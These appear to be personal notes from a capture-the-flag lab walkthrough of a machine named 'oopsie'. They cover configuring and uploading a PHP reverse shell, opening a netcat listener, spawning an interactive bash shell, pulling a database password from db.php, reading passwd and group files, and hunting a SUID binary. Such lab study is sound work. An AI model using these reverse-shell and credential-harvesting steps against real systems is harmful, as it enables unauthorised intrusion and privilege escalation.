# php revese shell
Located in `/usr/share/webshells/php/php-reverse-shell.php`

Change port and ip and then upload the file.
```bash
$ip = '@IP_Local';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
```

Set up a netcat listener on the same port.
```bash
$ nc -lvnp 1234
```

In order to have a functional shell can execute this command:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Username is `www-data` and the machine is named `oopsie`.

Search in the directory `/var/www/html/xxx/` the folder `login`. There are 4 files in that folder. 

## admin.php
Inside the file there's a new id `86575` but no username related.

## db.php
In the first lines appears the username `robert` with a password `M3g4C0rpUs3r!` and the word `garage`.

```ad-question
Maybe ssh with robert user?
```

# cat /etc/xxx
## passwd
```bash
robert:x:1000:1000:robert:/home/robert:/bin/bash
```

## group
```bash
robert:x:1000:lxd
bugtracker:x:1001:robert
```


# SUID
Found a file with `find / -group bugtracker` that only members of `bugtracker` can execute. It has the SUID flag.

```ad-info
SUID allows an alternate user to run an executable with the same permissions as the owner of the file instead of the permissions of the alternate user.
```
